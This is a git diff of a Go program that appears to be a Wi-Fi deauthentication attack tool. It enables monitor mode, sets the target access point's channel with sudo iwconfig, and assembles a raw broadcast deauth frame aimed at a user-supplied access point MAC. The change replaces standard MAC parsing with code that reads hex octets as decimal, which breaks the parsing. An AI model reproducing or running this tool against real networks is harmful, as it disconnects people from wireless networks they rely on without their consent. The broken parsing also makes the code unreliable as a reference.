@@ -5,7 +5,6 @@ import (
 	"encoding/binary"
 	"flag"
 	"fmt"
-	"net"
 	"os"
 	"os/exec"
 	"strconv"
@@ -71,7 +70,7 @@ func Turnonmon(name string) {
 func _Init_(User_interface string) int {
 	Turnonmon(User_interface)
 	tmp_CH := ""
-	fmt.Println("input Your AP Channel : ")
+	fmt.Printf("input Your AP Channel : ")
 	fmt.Scanln(&tmp_CH)
 	ExcuteCMD("sudo", "iwconfig", User_interface, "channel", tmp_CH)
 	CH, err := strconv.Atoi(tmp_CH)
@@ -87,12 +86,18 @@ func AP_broadcast(User_interface string, Ap_mac string) {
 	buffer := new(bytes.Buffer)
 	Deauth_Header := [21]byte{0x00, 0x00, 0x0b, 0x00, 0x00, 0x80, 0x02, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
 	binary.Write(buffer, binary.LittleEndian, Deauth_Header)
-
-	addr, err := net.ParseMAC(Ap_mac)
-	if err != nil {
-		fmt.Println(err)
+	addr := strings.SplitN(Ap_mac, ":", 6)
+	var tmp_mac []uint8
+	for _, str := range addr {
+		tmp_uint64, err := strconv.ParseUint(str, 10, 64)
+		if err != nil {
+			fmt.Println(err)
+		}
+		tmp_uint8 := uint8(tmp_uint64)
+		fmt.Println(str)
+		tmp_mac = append(tmp_mac, tmp_uint8)
 	}
-	fmt.Println(addr)
+	fmt.Println(tmp_mac)
 
 	// Deauth_AP_MAC := [12]byte{0xb2, 0x9f, 0x30, 0x4e, 0xed, 0xdb, 0xb2, 0x9f, 0x30, 0x4e, 0xed, 0xdb}
 	// Deauth_Footer := [4]byte{0x50, 0x4f, 0x07, 0x00}
